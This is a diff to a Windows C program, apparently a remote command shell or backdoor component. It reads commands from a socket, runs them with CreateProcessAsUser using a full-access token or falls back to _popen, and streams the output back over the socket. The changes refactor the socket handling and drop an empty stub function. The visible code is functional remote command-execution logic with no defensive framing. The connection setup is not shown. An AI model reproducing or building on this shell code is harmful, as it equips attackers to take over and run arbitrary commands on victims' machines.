@@ -3,12 +3,9 @@
 #include <windows.h>
 #include <userenv.h>
 
-void sendChunkedData(const char *data, int length);
-void executeCommandAsUser(HANDLE hToken, const char *command);
-void Popen(const char *command);
-void WSRNCmd(const char* command);
-
-SOCKET clientSocket;
+void sendChunkedData(SOCKET s, const char *data, int length);
+void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command);
+void Popen(SOCKET s,const char *command);
 
 int main()
 {
@@ -52,7 +49,7 @@ int main()
             buffer[bytesReceived] = '\0';
             if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
             {
-                executeCommandAsUser(hToken, buffer);
+                executeCommandAsUser(clientSocket, hToken, buffer);
                 CloseHandle(hToken);
             }
             else
@@ -78,7 +75,7 @@ int main()
     return 0;
 }
 
-void executeCommandAsUser(HANDLE hToken, const char *command)
+void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command)
 {
     HANDLE hReadPipe, hWritePipe;
     SECURITY_ATTRIBUTES saAttr;
@@ -95,7 +92,7 @@ void executeCommandAsUser(HANDLE hToken, const char *command)
     if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
     {
         fprintf(stderr, "创建管道时出错\n");
-        Popen(command);
+        Popen(s,command);
         return;
     }
 
@@ -108,7 +105,7 @@ void executeCommandAsUser(HANDLE hToken, const char *command)
     if (!CreateProcessAsUser(hToken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
     {
         fprintf(stderr, "以用户身份创建进程时出错\n");
-        Popen(command);
+        Popen(s,command);
         CloseHandle(hReadPipe);
         CloseHandle(hWritePipe);
         return;
@@ -118,19 +115,19 @@ void executeCommandAsUser(HANDLE hToken, const char *command)
 
     while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
     {
-        sendChunkedData(buffer, bytesRead);
+        sendChunkedData(s, buffer, bytesRead);
     }
 
     CloseHandle(hReadPipe);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
-void sendChunkedData(const char *data, int length)
+void sendChunkedData(SOCKET s, const char *data, int length)
 {
     int totalSent = 0;
     while (totalSent < length)
     {
-        int bytesSent = send(clientSocket, data + totalSent, length - totalSent, 0);
+        int bytesSent = send(s, data + totalSent, length - totalSent, 0);
         if (bytesSent == SOCKET_ERROR)
         {
             fprintf(stderr, "Error sending data\n");
@@ -139,25 +136,20 @@ void sendChunkedData(const char *data, int length)
         totalSent += bytesSent;
     }
 }
-void Popen(const char *command)
-{
+void Popen(SOCKET s,const char* command){
     FILE *fp;
-    char buffer[102400];
+        char buffer[102400];
 
-    if ((fp = _popen(command, "r")) == NULL)
-    {
-        fprintf(stderr, "执行命令时出错\n");
-        return;
-    }
+        if ((fp = _popen(command, "r")) == NULL)
+        {
+            fprintf(stderr, "执行命令时出错\n");
+            return;
+        }
 
-    while (fgets(buffer, sizeof(buffer), fp) != NULL)
-    {
-        sendChunkedData(buffer, strlen(buffer));
-    }
+        while (fgets(buffer, sizeof(buffer), fp) != NULL)
+        {
+            sendChunkedData(s, buffer, strlen(buffer));
+        }
 
-    _pclose(fp);
-}
-
-void WSRMCmd(const char* command){
-    
+        _pclose(fp);
 }
